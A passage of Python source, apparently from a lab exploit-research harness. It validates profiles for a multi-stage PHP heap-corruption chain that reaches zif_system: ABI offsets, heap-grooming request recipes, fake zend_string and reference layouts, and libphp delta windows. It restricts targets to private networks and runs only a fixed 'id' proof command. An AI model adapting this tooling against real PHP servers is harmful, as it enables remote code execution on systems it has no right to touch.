"""Strict profiles and manifests for the local php2shell research harness.

The normal exploit path deliberately has no numeric override flags.  A build
is runnable only when its complete profile is marked verified and a fresh
target manifest binds that profile to the inspected local lab target.
"""

from __future__ import annotations

import hashlib
import ipaddress
import json
import re
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from types import MappingProxyType
from typing import Any, Iterable, Mapping


class ProfileError(ValueError):
    pass


HEX_RE = re.compile(r"0x(?:0|[1-9a-f][0-9a-f]*)\Z")
SHA_RE = re.compile(r"[0-9a-f]{64}\Z")
ID_RE = re.compile(r"[a-z0-9][a-z0-9._-]{0,127}\Z")
PROOF_TARGET_RE = re.compile(r"/out/[A-Za-z0-9][A-Za-z0-9._-]{0,47}\Z")

_PRIVATE_NETWORKS = tuple(
    ipaddress.ip_network(x)
    for x in (
        "127.0.0.0/8",
        "::1/128",
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16",
        "fc00::/7",
    )
)


def _pairs_no_duplicates(pairs: list[tuple[str, Any]]) -> dict[str, Any]:
    out: dict[str, Any] = {}
    for key, value in pairs:
        if key in out:
            raise ProfileError(f"duplicate JSON key: {key!r}")
        out[key] = value
    return out


def _reject_constant(value: str) -> None:
    raise ProfileError(f"non-finite JSON number is forbidden: {value}")


def load_json(path: str | Path) -> tuple[dict[str, Any], bytes]:
    p = Path(path)
    try:
        raw = p.read_bytes()
    except OSError as exc:
        raise ProfileError(f"cannot read {p}: {exc}") from exc
    try:
        value = json.loads(
            raw.decode("utf-8"),
            object_pairs_hook=_pairs_no_duplicates,
            parse_constant=_reject_constant,
        )
    except (UnicodeError, json.JSONDecodeError) as exc:
        raise ProfileError(f"invalid JSON in {p}: {exc}") from exc
    if not isinstance(value, dict):
        raise ProfileError(f"{p}: top-level JSON value must be an object")
    return value, raw


def _freeze(value: Any) -> Any:
    if isinstance(value, dict):
        return MappingProxyType({k: _freeze(v) for k, v in value.items()})
    if isinstance(value, list):
        return tuple(_freeze(v) for v in value)
    return value


def _need_obj(value: Any, where: str) -> dict[str, Any]:
    if not isinstance(value, dict):
        raise ProfileError(f"{where} must be an object")
    return value


def _need_list(value: Any, where: str) -> list[Any]:
    if not isinstance(value, list):
        raise ProfileError(f"{where} must be an array")
    return value


def _need_str(value: Any, where: str, *, nonempty: bool = True) -> str:
    if not isinstance(value, str) or (nonempty and not value):
        raise ProfileError(f"{where} must be a{' non-empty' if nonempty else ''} string")
    return value


def _need_int(value: Any, where: str, minimum: int = 0) -> int:
    if isinstance(value, bool) or not isinstance(value, int) or value < minimum:
        raise ProfileError(f"{where} must be an integer >= {minimum}")
    return value


def _need_bool(value: Any, where: str) -> bool:
    if not isinstance(value, bool):
        raise ProfileError(f"{where} must be true or false")
    return value


def _keys(obj: Mapping[str, Any], where: str, required: Iterable[str]) -> None:
    want = set(required)
    got = set(obj)
    missing = sorted(want - got)
    extra = sorted(got - want)
    if missing or extra:
        bits = []
        if missing:
            bits.append("missing " + ", ".join(missing))
        if extra:
            bits.append("unknown " + ", ".join(extra))
        raise ProfileError(f"{where}: {'; '.join(bits)}")


def _keys_with_optional(
    obj: Mapping[str, Any],
    where: str,
    required: Iterable[str],
    optional: Iterable[str],
) -> None:
    want = set(required)
    allowed = want | set(optional)
    got = set(obj)
    missing = sorted(want - got)
    extra = sorted(got - allowed)
    if missing or extra:
        bits = []
        if missing:
            bits.append("missing " + ", ".join(missing))
        if extra:
            bits.append("unknown " + ", ".join(extra))
        raise ProfileError(f"{where}: {'; '.join(bits)}")


def parse_hex(value: Any, where: str) -> int:
    if not isinstance(value, str) or not HEX_RE.fullmatch(value):
        raise ProfileError(f"{where} must be canonical lowercase hexadecimal (0x...)")
    return int(value, 16)


def _power_of_two(value: int) -> bool:
    return value > 0 and value & (value - 1) == 0


def is_allowed_lab_address(value: str | ipaddress._BaseAddress) -> bool:
    try:
        addr = value if isinstance(value, ipaddress._BaseAddress) else ipaddress.ip_address(value)
    except ValueError:
        return False
    if isinstance(addr, ipaddress.IPv6Address) and addr.ipv4_mapped is not None:
        addr = addr.ipv4_mapped
    return any(addr in net for net in _PRIVATE_NETWORKS if addr.version == net.version)


def safe_proof_command(target_path: str) -> bytes:
    """Return the only command this harness is willing to execute."""
    if not PROOF_TARGET_RE.fullmatch(target_path):
        raise ProfileError(
            "proof target must be /out/<simple-name> (letters, digits, '.', '_' or '-')"
        )
    return ("id>" + target_path).encode("ascii")


def _validate_offset_map(obj: Any, where: str, required: Iterable[str]) -> dict[str, int]:
    src = _need_obj(obj, where)
    required_set = set(required)
    missing = sorted(required_set - set(src))
    if missing:
        raise ProfileError(f"{where}: missing {', '.join(missing)}")
    if not src:
        raise ProfileError(f"{where} must not be empty")
    return {key: parse_hex(value, f"{where}.{key}") for key, value in src.items()}


ABI_REQUIRED = {
    "zend_string": ("size_before_val", "len", "val"),
    "zval": ("size", "value", "type_info"),
    "zend_reference": ("size", "gc", "val", "sources"),
    "zend_array": (
        "size", "gc", "flags", "table_mask", "ar_data", "num_used",
        "num_elements", "table_size", "internal_pointer", "next_free", "destructor",
    ),
    "zend_execute_data": (
        "size", "opline", "call", "return_value", "func", "this", "num_args",
        "prev", "symbol_table", "call_info", "arg1",
    ),
    "types": ("is_string", "is_array", "is_reference", "gc_string", "array_ex"),
}

RUNTIME_BASE_KEYS = (
    "mpm", "workers", "memory_limit", "post_max_size", "upload_max_filesize",
    "max_input_vars", "display_errors", "file_uploads", "session_extension",
    "upload_progress_enabled", "session_name", "upload_progress_name",
)

PHP81_TRANS_SID_RUNTIME_KEYS = (
    "session_use_trans_sid", "session_use_cookies", "session_use_only_cookies",
    "upload_progress_cleanup", "url_rewriter_tags",
)

PHP81_URL_REWRITER_TAGS = "a=href,area=href,frame=src,form="

# Profile schema v1 inherited the key ``call_info`` for execute-data offset
# 0x40.  On the supported PHP 8 ABI that member is actually
# ``zend_execute_data.run_time_cache``.  Keep the serialized key for v1
# compatibility; code that consumes it should use the accurate local name.


@dataclass(frozen=True)
class Profile:
    path: Path
    raw: Mapping[str, Any]
    file_sha256: str

    @property
    def id(self) -> str:
        return str(self.raw["id"])

    @property
    def strategy(self) -> str:
        recipe = self.raw["request_recipe"]
        direct = recipe.get("strategy")
        if direct in ("pure-http-oom-v1", "php81-trans-sid-v1"):
            return str(direct)
        return str(recipe["stage3"]["strategy"])

    def hx(self, *keys: str) -> int:
        value: Any = self.raw
        for key in keys:
            value = value[key]
        return parse_hex(value, ".".join(keys))


def validate_profile(data: dict[str, Any], *, source: str = "profile") -> None:
    _keys(data, source, (
        "schema_version", "id", "verification", "build", "symbols", "abi",
        "runtime", "request_recipe", "provenance",
    ))
    if data["schema_version"] != 1:
        raise ProfileError(f"{source}.schema_version must be 1")
    ident = _need_str(data["id"], f"{source}.id")
    if not ID_RE.fullmatch(ident):
        raise ProfileError(f"{source}.id has an invalid format")

    verification = _need_obj(data["verification"], f"{source}.verification")
    _keys(verification, f"{source}.verification", ("state", "runs", "proof", "verified_at"))
    if verification["state"] not in ("candidate", "verified", "retired"):
        raise ProfileError(f"{source}.verification.state is invalid")
    runs = _need_int(verification["runs"], f"{source}.verification.runs")
    _need_str(verification["proof"], f"{source}.verification.proof")
    when = verification["verified_at"]
    if when is not None:
        _parse_time(_need_str(when, f"{source}.verification.verified_at"))
    if verification["state"] == "verified" and (runs < 1 or when is None):
        raise ProfileError(f"{source}: verified profiles need runs >= 1 and verified_at")

    build = _need_obj(data["build"], f"{source}.build")
    _keys(build, f"{source}.build", ("image", "php", "libphp"))
    image = _need_obj(build["image"], f"{source}.build.image")
    _keys(image, f"{source}.build.image", ("repo_digest", "image_id", "platform"))
    if not re.fullmatch(r"[^@]+@sha256:[0-9a-f]{64}", _need_str(image["repo_digest"], "repo_digest")):
        raise ProfileError(f"{source}.build.image.repo_digest is invalid")
    if not re.fullmatch(r"sha256:[0-9a-f]{64}", _need_str(image["image_id"], "image_id")):
        raise ProfileError(f"{source}.build.image.image_id is invalid")
    if image["platform"] != "linux/amd64":
        raise ProfileError(f"{source}: only linux/amd64 profiles are supported")

    php = _need_obj(build["php"], f"{source}.build.php")
    _keys(php, f"{source}.build.php", ("version", "sapi", "zts", "debug"))
    if not re.fullmatch(r"[0-9]+\.[0-9]+\.[0-9]+(?:[-+].*)?", _need_str(php["version"], "version")):
        raise ProfileError(f"{source}.build.php.version is invalid")
    if php["sapi"] != "apache2handler" or php["zts"] is not False:
        raise ProfileError(f"{source}: only non-ZTS apache2handler is supported")
    _need_bool(php["debug"], f"{source}.build.php.debug")

    libphp = _need_obj(build["libphp"], f"{source}.build.libphp")
    _keys(libphp, f"{source}.build.libphp", (
        "path", "sha256", "gnu_build_id", "elf_class", "endianness", "machine", "type",
    ))
    if not re.fullmatch(r"/.*libphp[^/]*\.so", _need_str(libphp["path"], "libphp.path")):
        raise ProfileError(f"{source}.build.libphp.path is invalid")
    if not SHA_RE.fullmatch(_need_str(libphp["sha256"], "libphp.sha256")):
        raise ProfileError(f"{source}.build.libphp.sha256 is invalid")
    build_id = libphp["gnu_build_id"]
    if build_id is not None and not re.fullmatch(r"[0-9a-f]{16,128}", _need_str(build_id, "build-id")):
        raise ProfileError(f"{source}.build.libphp.gnu_build_id is invalid")
    expected_elf = {"elf_class": 64, "endianness": "little", "machine": "EM_X86_64", "type": "ET_DYN"}
    for key, value in expected_elf.items():
        if libphp[key] != value:
            raise ProfileError(f"{source}.build.libphp.{key} must be {value!r}")

    symbols = _need_obj(data["symbols"], f"{source}.symbols")
    _keys(symbols, f"{source}.symbols", ("zif_system", "zval_ptr_dtor"))
    for key in ("zif_system", "zval_ptr_dtor"):
        item = _need_obj(symbols[key], f"{source}.symbols.{key}")
        _keys(item, f"{source}.symbols.{key}", ("name", "offset"))
        if item["name"] != key:
            raise ProfileError(f"{source}.symbols.{key}.name must be {key!r}")
        if parse_hex(item["offset"], f"{source}.symbols.{key}.offset") == 0:
            raise ProfileError(f"{source}.symbols.{key}.offset must be non-zero")

    abi = _need_obj(data["abi"], f"{source}.abi")
    _keys(abi, f"{source}.abi", (
        "pointer_size", "page_size", "zend_mm_chunk_size", "zend_string", "zval",
        "zend_reference", "zend_array", "zend_execute_data", "types",
    ))
    if abi["pointer_size"] != 8:
        raise ProfileError(f"{source}.abi.pointer_size must be 8")
    page = parse_hex(abi["page_size"], f"{source}.abi.page_size")
    chunk = parse_hex(abi["zend_mm_chunk_size"], f"{source}.abi.zend_mm_chunk_size")
    if not _power_of_two(page) or not _power_of_two(chunk) or page > chunk:
        raise ProfileError(f"{source}: invalid page/chunk geometry")
    parsed_abi = {
        key: _validate_offset_map(abi[key], f"{source}.abi.{key}", needed)
        for key, needed in ABI_REQUIRED.items()
    }
    _validate_abi_bounds(parsed_abi, source)

    recipe = _need_obj(data["request_recipe"], f"{source}.request_recipe")
    recipe_strategy = recipe.get("strategy", "legacy-multipart-v1")

    runtime = _need_obj(data["runtime"], f"{source}.runtime")
    runtime_keys = RUNTIME_BASE_KEYS
    if recipe_strategy == "php81-trans-sid-v1":
        runtime_keys += PHP81_TRANS_SID_RUNTIME_KEYS
        _keys(runtime, f"{source}.runtime", runtime_keys)
    else:
        _keys_with_optional(
            runtime,
            f"{source}.runtime",
            runtime_keys,
            PHP81_TRANS_SID_RUNTIME_KEYS,
        )
    if runtime["mpm"] != "prefork" or _need_int(runtime["workers"], "workers", 1) != 1:
        raise ProfileError(f"{source}: current chain requires exactly one prefork worker")
    for key in ("memory_limit", "post_max_size", "upload_max_filesize", "session_name", "upload_progress_name"):
        _need_str(runtime[key], f"{source}.runtime.{key}")
    max_input_vars = _need_int(runtime["max_input_vars"], f"{source}.runtime.max_input_vars", 1)
    display_errors = _need_bool(runtime["display_errors"], f"{source}.runtime.display_errors")
    expected_display = recipe_strategy not in ("pure-http-oom-v1", "php81-trans-sid-v1")
    if display_errors is not expected_display:
        raise ProfileError(
            f"{source}.runtime.display_errors must be "
            f"{'true' if expected_display else 'false'} for {recipe_strategy}"
        )
    for key in ("file_uploads", "session_extension", "upload_progress_enabled"):
        if runtime[key] is not True:
            raise ProfileError(f"{source}.runtime.{key} must be true")
    for key in ("session_name", "upload_progress_name"):
        if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{0,63}", runtime[key]):
            raise ProfileError(f"{source}.runtime.{key} must be a simple PHP field name")

    for key in PHP81_TRANS_SID_RUNTIME_KEYS[:-1]:
        if key in runtime:
            _need_bool(runtime[key], f"{source}.runtime.{key}")
    if "url_rewriter_tags" in runtime:
        _need_str(runtime["url_rewriter_tags"], f"{source}.runtime.url_rewriter_tags")

    if recipe_strategy == "php81-trans-sid-v1":
        php81_runtime = {
            "session_use_trans_sid": True,
            "session_use_cookies": False,
            "session_use_only_cookies": False,
            "upload_progress_cleanup": True,
        }
        for key, expected in php81_runtime.items():
            value = runtime[key]
            if value is not expected:
                raise ProfileError(
                    f"{source}.runtime.{key} must be "
                    f"{'true' if expected else 'false'} for php81-trans-sid-v1"
                )
        tags = runtime["url_rewriter_tags"]
        if tags != PHP81_URL_REWRITER_TAGS:
            raise ProfileError(
                f"{source}.runtime.url_rewriter_tags must exactly match the "
                "profiled trans-SID rewrite surface"
            )

    if recipe_strategy == "pure-http-oom-v1":
        _validate_pure_http_recipe(recipe, parsed_abi, page, chunk, max_input_vars)
    elif recipe_strategy == "php81-trans-sid-v1":
        trans_sid_memory = {
            "8.0.30": "108M",
            "8.1.34": "128M",
        }
        expected_memory = trans_sid_memory.get(php["version"])
        if expected_memory is None:
            raise ProfileError(
                f"{source}: php81-trans-sid-v1 has no verified exact-build "
                f"geometry for PHP {php['version']}"
            )
        if (
            runtime["memory_limit"] != expected_memory
            or runtime["post_max_size"] != "192M"
            or runtime["upload_max_filesize"] != "192M"
            or max_input_vars != 1000
        ):
            raise ProfileError(
                f"{source}: php81-trans-sid-v1 requires the exact "
                f"{expected_memory}/192M/192M/1000 runtime for PHP {php['version']}"
            )
        _validate_php81_trans_sid_recipe(
            recipe, parsed_abi, page, chunk, max_input_vars
        )
    elif recipe_strategy == "legacy-multipart-v1":
        _validate_legacy_recipe(recipe, parsed_abi, page, chunk, max_input_vars)
    else:
        raise ProfileError(f"unsupported request recipe strategy: {recipe_strategy!r}")

    provenance = _need_obj(data["provenance"], f"{source}.provenance")
    _keys(provenance, f"{source}.provenance", ("source", "notes"))
    _need_str(provenance["source"], f"{source}.provenance.source")
    _need_str(provenance["notes"], f"{source}.provenance.notes", nonempty=False)


def _validate_legacy_recipe(
    recipe: dict[str, Any],
    parsed_abi: Mapping[str, Mapping[str, int]],
    page: int,
    chunk: int,
    max_input_vars: int,
) -> None:
    _keys(recipe, "request_recipe", ("huge_mb", "rotate_fillers", "stage1", "stage2", "stage3"))
    huge_mb = _need_int(recipe["huge_mb"], "huge_mb", 1)
    if huge_mb > 64:
        raise ProfileError("huge_mb exceeds the 64 MiB safety bound")
    rotate_fillers = _need_int(recipe["rotate_fillers"], "rotate_fillers", 1)
    if rotate_fillers > 4096:
        raise ProfileError("rotate_fillers exceeds the 4096-field safety bound")
    stage1 = _need_obj(recipe["stage1"], "stage1")
    _keys(stage1, "stage1", ("fillers", "allow_cookie_self_calibration"))
    stage1_fillers = _need_int(stage1["fillers"], "stage1.fillers", 1)
    if stage1_fillers > 4096 or stage1_fillers + 3 > max_input_vars:
        raise ProfileError("stage1.fillers exceeds safe/runtime input bounds")
    _need_bool(stage1["allow_cookie_self_calibration"], "stage1.allow_cookie_self_calibration")
    stage2 = _need_obj(recipe["stage2"], "stage2")
    stage2_strategy = stage2.get("strategy")
    if stage2_strategy == "fixed-array-v1":
        _keys(stage2, "stage2", ("strategy", "fillers", "target", "target_count", "value_len"))
        fillers = _need_int(stage2["fillers"], "stage2.fillers", 1)
        target = _need_int(stage2["target"], "stage2.target")
        target_count = _need_int(stage2["target_count"], "stage2.target_count", 1)
        value_len = _need_int(stage2["value_len"], "stage2.value_len", 1)
        if fillers > 4096 or target_count > 512 or value_len > 4096:
            raise ProfileError("fixed-array-v1 stage2 values exceed safe profile bounds")
        if target >= fillers:
            raise ProfileError("stage2.target must be below stage2.fillers")
        if fillers + target_count + 1 > max_input_vars:
            raise ProfileError("fixed-array-v1 stage2 exceeds runtime.max_input_vars")
    elif stage2_strategy == "adaptive-window-v1":
        _keys(stage2, "stage2", ("strategy", "window", "arrays"))
        window = parse_hex(stage2["window"], "stage2.window")
        arrays = _need_int(stage2["arrays"], "stage2.arrays", 1)
        if window < page or window > chunk or window % page:
            raise ProfileError("adaptive-window-v1 window must be page-aligned within one chunk")
        if arrays > 512:
            raise ProfileError("adaptive-window-v1 arrays exceeds safe profile bounds")
        if stage1_fillers + arrays + 3 > max_input_vars:
            raise ProfileError("adaptive-window-v1 request exceeds runtime.max_input_vars")
    else:
        raise ProfileError(f"unsupported stage2 strategy: {stage2_strategy!r}")
    _validate_stage3(
        _need_obj(recipe["stage3"], "stage3"), parsed_abi, page, chunk, max_input_vars
    )


def _bounded_int(value: Any, where: str, minimum: int, maximum: int) -> int:
    parsed = _need_int(value, where, minimum)
    if parsed > maximum:
        raise ProfileError(f"{where} must be <= {maximum}")
    return parsed


def _validate_counted_shape(
    value: Any,
    where: str,
    *,
    name: bool = True,
) -> tuple[int, int, int | None]:
    obj = _need_obj(value, where)
    keys = ("count", "name_len", "value_len") if name else ("count", "value_len")
    _keys(obj, where, keys)
    count = _bounded_int(obj["count"], f"{where}.count", 0, 4096)
    name_len = _bounded_int(obj.get("name_len", 0), f"{where}.name_len", 1 if name else 0, 4096)
    value_len = _bounded_int(obj["value_len"], f"{where}.value_len", 0, 65536)
    return count, value_len, name_len if name else None


def _validate_pure_http_recipe(
    recipe: dict[str, Any],
    abi: Mapping[str, Mapping[str, int]],
    page: int,
    chunk: int,
    max_input_vars: int,
) -> None:
    _keys(recipe, "request_recipe", ("strategy", "query_fields", "a1", "b1", "a2", "b2"))
    if recipe["strategy"] != "pure-http-oom-v1":
        raise ProfileError("pure HTTP recipe has the wrong strategy name")
    _bounded_int(recipe["query_fields"], "request_recipe.query_fields", 0, 32)

    a1 = _need_obj(recipe["a1"], "request_recipe.a1")
    _keys(a1, "request_recipe.a1", (
        "boundary_len", "nested_parts", "depth", "key_pad", "ctype_lengths",
        "small_fillers", "tune", "large_fields", "burners", "progress_len", "tail",
    ))
    _bounded_int(a1["boundary_len"], "a1.boundary_len", 8, 128)
    _bounded_int(a1["nested_parts"], "a1.nested_parts", 1, 4096)
    _bounded_int(a1["depth"], "a1.depth", 2, 64)
    _bounded_int(a1["key_pad"], "a1.key_pad", 0, 512)
    ctypes = _need_list(a1["ctype_lengths"], "a1.ctype_lengths")
    if len(ctypes) != 2:
        raise ProfileError("a1.ctype_lengths must contain exactly two measured values")
    for index, value in enumerate(ctypes):
        _bounded_int(value, f"a1.ctype_lengths[{index}]", 1, 4096)
    small_count, _small_value, _small_name = _validate_counted_shape(
        a1["small_fillers"], "a1.small_fillers"
    )
    tune_count, _tune_value, _tune_name = _validate_counted_shape(a1["tune"], "a1.tune")
    large = _need_obj(a1["large_fields"], "a1.large_fields")
    _keys(large, "a1.large_fields", ("count", "value_len", "long_name_count", "long_name_len"))
    large_count = _bounded_int(large["count"], "a1.large_fields.count", 1, 512)
    _bounded_int(large["value_len"], "a1.large_fields.value_len", 1, 65536)
    long_count = _bounded_int(large["long_name_count"], "a1.large_fields.long_name_count", 0, large_count)
    _bounded_int(large["long_name_len"], "a1.large_fields.long_name_len", 5 if long_count else 0, 4096)
    burners_count, _burner_value, _ = _validate_counted_shape(
        a1["burners"], "a1.burners", name=False
    )
    _bounded_int(a1["progress_len"], "a1.progress_len", 1, 65536)
    tail_count, _tail_value, _tail_name = _validate_counted_shape(a1["tail"], "a1.tail")
    scalar_a1 = 2 + small_count + tune_count + large_count + burners_count + tail_count
    if scalar_a1 > max_input_vars:
        raise ProfileError("pure HTTP A1 scalar fields exceed runtime.max_input_vars")

    b1 = _need_obj(recipe["b1"], "request_recipe.b1")
    _keys(b1, "request_recipe.b1", (
        "boundary_len", "target_offset", "fake_len", "allocator_overhead",
        "value_data_offset", "name_len", "large_pages", "hit_index",
        "nested_fillers", "min_dtor_hits", "main_candidates",
        "libphp_delta_min", "libphp_delta_max",
    ))
    _bounded_int(b1["boundary_len"], "b1.boundary_len", 8, 128)
    target_offset = parse_hex(b1["target_offset"], "b1.target_offset")
    fake_len = parse_hex(b1["fake_len"], "b1.fake_len")
    if not (0x20 <= target_offset < chunk) or not (page <= fake_len <= chunk):
        raise ProfileError("b1 target/fake length must stay inside one Zend MM chunk")
    overhead = _bounded_int(b1["allocator_overhead"], "b1.allocator_overhead", 1, 1024)
    value_data_offset = _bounded_int(b1["value_data_offset"], "b1.value_data_offset", 0x18, chunk)
    _bounded_int(b1["name_len"], "b1.name_len", 1, 4096)
    pages = _need_list(b1["large_pages"], "b1.large_pages")
    if not 1 <= len(pages) <= 64:
        raise ProfileError("b1.large_pages must contain 1..64 entries")
    parsed_pages = [_bounded_int(value, "b1.large_pages entry", 1, chunk // page) for value in pages]
    hit_index = _bounded_int(b1["hit_index"], "b1.hit_index", 0, len(parsed_pages) - 1)
    header = target_offset - value_data_offset
    if header < 0 or header + 0x20 > parsed_pages[hit_index] * page - overhead:
        raise ProfileError("b1 hit value cannot contain the fake zend_string")
    nested_fillers = _bounded_int(b1["nested_fillers"], "b1.nested_fillers", 0, 4096)
    if 2 + len(parsed_pages) + nested_fillers > max_input_vars:
        raise ProfileError("pure HTTP B1 fields exceed runtime.max_input_vars")
    _bounded_int(b1["min_dtor_hits"], "b1.min_dtor_hits", 1, 4096)
    _bounded_int(b1["main_candidates"], "b1.main_candidates", 1, 16)
    delta_lo = parse_hex(b1["libphp_delta_min"], "b1.libphp_delta_min")
    delta_hi = parse_hex(b1["libphp_delta_max"], "b1.libphp_delta_max")
    if not 0 < delta_lo < delta_hi <= 0x100000000:
        raise ProfileError("b1 libphp/main delta window is invalid")

    a2 = _need_obj(recipe["a2"], "request_recipe.a2")
    _keys(a2, "request_recipe.a2", ("boundary_len", "nested_parts", "depth", "fillers"))
    _bounded_int(a2["boundary_len"], "a2.boundary_len", 8, 128)
    _bounded_int(a2["nested_parts"], "a2.nested_parts", 1, 4096)
    _bounded_int(a2["depth"], "a2.depth", 2, 64)
    a2_fillers = _bounded_int(a2["fillers"], "a2.fillers", 0, 4096)
    if a2_fillers + 2 > max_input_vars:
        raise ProfileError("pure HTTP A2 scalar fields exceed runtime.max_input_vars")

    b2 = _need_obj(recipe["b2"], "request_recipe.b2")
    _keys(b2, "request_recipe.b2", (
        "boundary_len", "value_len", "before_fields", "after_fields", "name_len",
        "refcount", "reference_start", "reference_step", "fake_array_offset",
    ))
    _bounded_int(b2["boundary_len"], "b2.boundary_len", 8, 128)
    value_len = _bounded_int(b2["value_len"], "b2.value_len", 1, 4096)
    before = _bounded_int(b2["before_fields"], "b2.before_fields", 1, 4096)
    after = _bounded_int(b2["after_fields"], "b2.after_fields", 1, 4096)
    if before + after + 3 > max_input_vars:
        raise ProfileError("pure HTTP B2 fields exceed runtime.max_input_vars")
    _bounded_int(b2["name_len"], "b2.name_len", 1, 128)
    _bounded_int(b2["refcount"], "b2.refcount", 1, 2)
    ref_start = _bounded_int(b2["reference_start"], "b2.reference_start", 0, value_len - 1)
    ref_step = _bounded_int(b2["reference_step"], "b2.reference_step", abi["zend_reference"]["size"], value_len)
    if ref_start + abi["zend_reference"]["size"] > value_len or ref_step % 8:
        raise ProfileError("pure HTTP B2 fake-reference layout is invalid")
    fake_array_offset = parse_hex(b2["fake_array_offset"], "b2.fake_array_offset")
    if fake_array_offset >= chunk:
        raise ProfileError("b2.fake_array_offset must be inside one Zend MM chunk")
    _execute, _string, command_offset = layout_offsets(
        {key: {name: hex(number) for name, number in fields.items()} for key, fields in abi.items()}
    )
    if command_offset + len(safe_proof_command("/out/" + "a" * 48)) + 1 > value_len:
        raise ProfileError("pure HTTP B2 carrier cannot hold the fixed proof command")


def _validate_php81_trans_sid_recipe(
    recipe: dict[str, Any],
    abi: Mapping[str, Mapping[str, int]],
    page: int,
    chunk: int,
    max_input_vars: int,
) -> None:
    """Validate the bounded four-request PHP 8.0/8.1 trans-SID chain.

    This strategy is intentionally a separate recipe.  Its FILE_START OOM,
    trans-SID disclosure, streamed terminal producer, and terminal reclaim all
    rely on exact, profile-bound allocator geometry.
    """
    _keys(recipe, "request_recipe", ("strategy", "query_fields", "a1", "b1", "a2", "b2"))
    if recipe["strategy"] != "php81-trans-sid-v1":
        raise ProfileError("PHP 8.x trans-SID recipe has the wrong strategy name")
    _bounded_int(recipe["query_fields"], "request_recipe.query_fields", 0, 32)

    a1 = _need_obj(recipe["a1"], "request_recipe.a1")
    _keys(a1, "request_recipe.a1", (
        "boundary_len", "nested_parts", "depth", "key_pad", "ctype_lengths",
        "small_fillers", "large_fields", "burners", "pad", "progress_len",
        "pre_file_scalars", "pre_file_mix", "file",
    ))
    _bounded_int(a1["boundary_len"], "a1.boundary_len", 8, 128)
    nested_parts = _bounded_int(a1["nested_parts"], "a1.nested_parts", 1, 4096)
    _bounded_int(a1["depth"], "a1.depth", 2, 64)
    _bounded_int(a1["key_pad"], "a1.key_pad", 0, 512)
    ctypes = _need_list(a1["ctype_lengths"], "a1.ctype_lengths")
    if len(ctypes) != 2:
        raise ProfileError("a1.ctype_lengths must contain exactly two measured values")
    for index, value in enumerate(ctypes):
        _bounded_int(value, f"a1.ctype_lengths[{index}]", 1, 4096)

    small_count, _small_value, _small_name = _validate_counted_shape(
        a1["small_fillers"], "a1.small_fillers"
    )
    large = _need_obj(a1["large_fields"], "a1.large_fields")
    _keys(large, "a1.large_fields", ("count", "value_len"))
    large_count = _bounded_int(large["count"], "a1.large_fields.count", 1, 512)
    _bounded_int(large["value_len"], "a1.large_fields.value_len", 1, 65536)
    burner_count, _burner_value, _ = _validate_counted_shape(
        a1["burners"], "a1.burners", name=False
    )
    pad_shape = _need_obj(a1["pad"], "a1.pad")
    _keys(pad_shape, "a1.pad", ("name_len", "value_len"))
    _bounded_int(pad_shape["name_len"], "a1.pad.name_len", 1, 4096)
    _bounded_int(pad_shape["value_len"], "a1.pad.value_len", 1, 65536)
    _bounded_int(a1["progress_len"], "a1.progress_len", 1, 65536)

    scalar_groups = _need_list(a1["pre_file_scalars"], "a1.pre_file_scalars")
    if not 1 <= len(scalar_groups) <= 8:
        raise ProfileError("a1.pre_file_scalars must contain 1..8 groups")
    pre_scalar_count = 0
    for index, value in enumerate(scalar_groups):
        where = f"a1.pre_file_scalars[{index}]"
        group = _need_obj(value, where)
        _keys(group, where, ("count", "name_len", "value_len", "prefix", "fill"))
        pre_scalar_count += _bounded_int(group["count"], f"{where}.count", 1, 64)
        _bounded_int(group["name_len"], f"{where}.name_len", 1, 4096)
        _bounded_int(group["value_len"], f"{where}.value_len", 0, 65536)
        prefix = _need_str(group["prefix"], f"{where}.prefix")
        fill = _need_str(group["fill"], f"{where}.fill")
        if not re.fullmatch(r"[A-Za-z]", prefix) or not re.fullmatch(r"[A-Za-z]", fill):
            raise ProfileError(f"{where}.prefix/fill must each be one ASCII letter")

    mix = _need_list(a1["pre_file_mix"], "a1.pre_file_mix")
    if not 1 <= len(mix) <= 16:
        raise ProfileError("a1.pre_file_mix must contain 1..16 measured lengths")
    for index, value in enumerate(mix):
        _bounded_int(value, f"a1.pre_file_mix[{index}]", 0, 65536)

    a1_file = _need_obj(a1["file"], "a1.file")
    _keys(a1_file, "a1.file", ("name_len", "filename_len", "content_type_len", "value_len"))
    _bounded_int(a1_file["name_len"], "a1.file.name_len", 1, 4096)
    _bounded_int(a1_file["filename_len"], "a1.file.filename_len", 1, 1 << 20)
    _bounded_int(a1_file["content_type_len"], "a1.file.content_type_len", 1, 4096)
    _bounded_int(a1_file["value_len"], "a1.file.value_len", 0, 4096)
    a1_fields = (
        4 + nested_parts + small_count + large_count + burner_count
        + pre_scalar_count + len(mix)
    )
    if a1_fields > max_input_vars:
        raise ProfileError("PHP 8.x trans-SID A1 fields exceed runtime.max_input_vars")

    b1 = _need_obj(recipe["b1"], "request_recipe.b1")
    _keys(b1, "request_recipe.b1", (
        "boundary_len", "target_offset", "fake_len", "allocator_overhead",
        "value_data_offset", "name_len", "head_forged_fields", "forged_pages",
        "partial_flood_pages", "tail_forged_fields", "hit_index", "nested_fillers",
        "expected_prefix", "main_qword_offset", "min_dtor_hits",
        "libphp_delta_min", "libphp_delta_max",
    ))
    _bounded_int(b1["boundary_len"], "b1.boundary_len", 8, 128)
    target_offset = parse_hex(b1["target_offset"], "b1.target_offset")
    fake_len = parse_hex(b1["fake_len"], "b1.fake_len")
    if not 0x20 <= target_offset < chunk or not page <= fake_len <= 4 * chunk:
        raise ProfileError(
            "b1 target must stay inside one Zend MM chunk and fake length "
            "must stay within four chunks"
        )
    overhead = _bounded_int(b1["allocator_overhead"], "b1.allocator_overhead", 1, 1024)
    value_data_offset = _bounded_int(
        b1["value_data_offset"], "b1.value_data_offset", abi["zend_string"]["val"], chunk
    )
    _bounded_int(b1["name_len"], "b1.name_len", 1, 4096)
    head_count = _bounded_int(b1["head_forged_fields"], "b1.head_forged_fields", 1, 64)
    forged_pages = _bounded_int(b1["forged_pages"], "b1.forged_pages", 1, chunk // page)
    _bounded_int(
        b1["partial_flood_pages"], "b1.partial_flood_pages", 1, chunk // page
    )
    tail_count = _bounded_int(b1["tail_forged_fields"], "b1.tail_forged_fields", 1, 64)
    hit_index = _bounded_int(
        b1["hit_index"], "b1.hit_index", 0, head_count + tail_count
    )
    if hit_index == head_count:
        raise ProfileError("b1.hit_index must select a forged field, not the partial flood")
    header = target_offset - value_data_offset
    if header < 0 or header + 0x20 > forged_pages * page - overhead:
